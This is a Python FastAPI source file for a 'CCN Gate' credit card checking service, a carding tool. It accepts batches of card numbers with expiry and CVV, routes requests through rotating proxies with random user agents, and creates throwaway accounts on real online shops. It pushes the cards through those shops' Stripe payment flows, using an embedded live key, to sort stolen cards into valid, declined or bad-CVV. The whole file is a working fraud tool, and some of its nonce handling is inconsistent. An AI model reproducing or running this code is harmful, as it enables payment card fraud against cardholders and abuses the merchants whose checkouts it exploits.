from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import httpx
import random
import asyncio
import uuid
import string
from fake_useragent import UserAgent

app = FastAPI(title="CCN Gate API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Load proxies once
def load_proxies(path="proxies.txt"):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

PROXIES = load_proxies("proxies.txt")

class CCRequest(BaseModel):
    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

async def create_payment_method(fullz, session, proxy_url=None):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": UserAgent().random,
        }

        register_nonce = generate_nonce()

        # STEP 1: get nonce
        response = await session.get(
            "https://www.montrealcomicbookclub.com/my-account/", headers=headers
        )

        register1_nonce = gets(
            response.text,
            'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
            '" />',
        )

        # STEP 2: register user
        data = {
            "email": mail,
            "woocommerce-register-nonce": register_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        await session.post(
            "https://www.tsclabelprinters.co.nz/my-account/",
            headers=headers,
            data=data,
        )

        # STEP 3: add-payment page
        response = await session.get(
            "https://www.tsclabelprinters.co.nz/my-account/add-payment-method/",
            headers=headers,
        )
        setup_nonce = gets(
            response.text, '"createAndConfirmSetupIntentNonce":"', '","'
        )

        # STEP 4: Stripe PM
        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "billing_details[address][country]": "PK",
            "key": "pk_live_51QAJmHEXW5JgQdqNSKW7jnzEuBeLz1iWmqIt2rGL3MW3CkCGXBpM3iTo2FgEVZ0LhKOBgbtEVemYX7vdlzoQWzyh00guIul597",
        }

        resp = await session.post(
            "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
        )

        try:
            pm_id = resp.json().get("id")
        except Exception:
            return {"card": fullz, "status": "error", "message": "Failed to create PM", "proxy_used": proxy_url}

        # STEP 5: attach Woo
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }
        final = await session.post(
            "https://www.tsclabelprinters.co.nz/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data,
        )

        # RESPONSE HANDLING
        try:
            result = final.json()
            status = result.get("data", {}).get("status")
            error_message = result.get("data", {}).get("error", {}).get("message")

            if result.get("success") and status == "succeeded":
                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY", "proxy_used": proxy_url}
            elif status == "order_id":
                return {"card": fullz, "status": "charged", "message": "CCN $5 Charged", "proxy_used": proxy_url}
            elif status == "requires_action":
                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY (3DS/OTP)", "proxy_used": proxy_url}
            elif error_message == "Your card's security code is incorrect.":
                return {"card": fullz, "status": "invalid_cvv", "message": "INVALID CVV", "proxy_used": proxy_url}
            elif error_message == "Your card was declined.":
                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Your card number is incorrect.":
                return {"card": fullz, "status": "invalid_card", "message": "Incorrect card number", "proxy_used": proxy_url}
            elif error_message == "Your card does not support this type of purchase.":
                return {"card": fullz, "status": "unsupported", "message": "Card does not support this type of purchase", "proxy_used": proxy_url}
            elif error_message == "card_error":
                return {"card": fullz, "status": "unsupported", "message": "Card type not Supported", "proxy_used": proxy_url}
            else:
                return {"card": fullz, "status": "unknown", "message": str(result), "proxy_used": proxy_url}
        except Exception:
            return {"card": fullz, "status": "error", "message": final.text, "proxy_used": proxy_url}

    except Exception as e:
        return {"card": fullz, "status": "error", "message": str(e), "proxy_used": proxy_url}

# -----------------
# API ENDPOINTS
# -----------------
async def get_session(proxy_line: str):
    host, port, user, pwd = proxy_line.split(":")
    if "session-RANDOMID" in user:
        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
    session = httpx.AsyncClient(
        transport=transport,
        timeout=httpx.Timeout(60.0),
        trust_env=False,
        follow_redirects=True,
    )
    return session, proxy_url

@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    card_list = cards.split(",")[:5]  # max 5
    proxy_line = random.choice(PROXIES)
    session, proxy_url = await get_session(proxy_line)

    results = []
    for card in card_list:
        if card.strip():
            res = await create_payment_method(card.strip(), session, proxy_url)
            results.append(res)
    await session.aclose()
    return results

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    card_list = request.cards.split(",")[:5]
    proxy_line = random.choice(PROXIES)
    session, proxy_url = await get_session(proxy_line)

    results = []
    for card in card_list:
        if card.strip():
            res = await create_payment_method(card.strip(), session, proxy_url)
            results.append(res)
    await session.aclose()
    return results
